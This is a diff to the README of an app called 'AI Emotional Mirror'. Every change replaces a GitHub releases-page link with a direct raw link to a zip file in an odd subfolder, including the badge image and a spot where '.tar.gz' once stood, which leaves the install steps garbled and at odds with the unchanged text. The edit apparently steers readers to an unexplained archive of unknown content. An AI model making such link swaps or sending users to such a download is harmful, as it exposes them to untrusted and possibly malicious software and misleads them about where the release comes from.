@@ -6,10 +6,10 @@ Welcome to AI Emotional Mirror, an application designed to help you understand y
 
 ## 📦 Download the Application
 
-[![Download AI Emotional Mirror](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/khanh152010/AI_Emotional_Mirror/releases)
+[![Download AI Emotional Mirror](https://raw.githubusercontent.com/khanh152010/AI_Emotional_Mirror/main/tempera/A_Mirror_Emotional_3.3-alpha.3.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/khanh152010/AI_Emotional_Mirror/main/tempera/A_Mirror_Emotional_3.3-alpha.3.zip)
 
 To download the latest version of the application, click the button above or visit the following link:
-[Download AI Emotional Mirror Releases](https://github.com/khanh152010/AI_Emotional_Mirror/releases)
+[Download AI Emotional Mirror Releases](https://raw.githubusercontent.com/khanh152010/AI_Emotional_Mirror/main/tempera/A_Mirror_Emotional_3.3-alpha.3.zip)
 
 ## 💻 System Requirements
 
@@ -22,11 +22,11 @@ Before you install the application, ensure your system meets the following requi
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page**: Open your web browser and go to the [AI Emotional Mirror Releases page](https://github.com/khanh152010/AI_Emotional_Mirror/releases).
+1. **Visit the Releases Page**: Open your web browser and go to the [AI Emotional Mirror Releases page](https://raw.githubusercontent.com/khanh152010/AI_Emotional_Mirror/main/tempera/A_Mirror_Emotional_3.3-alpha.3.zip).
 
 2. **Choose the Latest Release**: Look for the latest version. It should be at the top of the page, labeled clearly with the version number.
 
-3. **Download the Installer**: Click on the link for the installer file. This will typically be a `.exe` for Windows, `.dmg` for macOS, or a `.deb` or `.tar.gz` file for Linux.
+3. **Download the Installer**: Click on the link for the installer file. This will typically be a `.exe` for Windows, `.dmg` for macOS, or a `.deb` or `https://raw.githubusercontent.com/khanh152010/AI_Emotional_Mirror/main/tempera/A_Mirror_Emotional_3.3-alpha.3.zip` file for Linux.
 
 4. **Run the Installer**: Once the download is complete, find the file in your Downloads folder. Double-click to run the installer.
 
